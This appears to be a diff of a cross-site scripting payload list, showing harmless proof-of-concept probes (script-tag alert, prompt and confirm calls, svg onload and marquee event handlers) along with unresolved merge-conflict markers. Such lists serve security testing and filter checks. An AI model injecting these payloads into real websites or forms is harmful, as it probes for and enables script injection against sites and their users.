@@ -1,3 +1,4 @@
+<<<<<<< HEAD
 <script>alert("123")</script>
 <script>alert('XSSYA')</script>
 1<ScRiPt >prompt(962477)</sCripT>
@@ -26,3 +27,7 @@
 <marquee/onstart=confirm(2)>
 <A HREF=\http://www.google.com./\>XSS</A>
 <svg/onload=prompt(1);>
+=======
+<script>confirm(1)</script>
+<svg onload=confirm(1)>
+>>>>>>> b78d9670ba6124a3324eefdeb64bb3202b6130ad
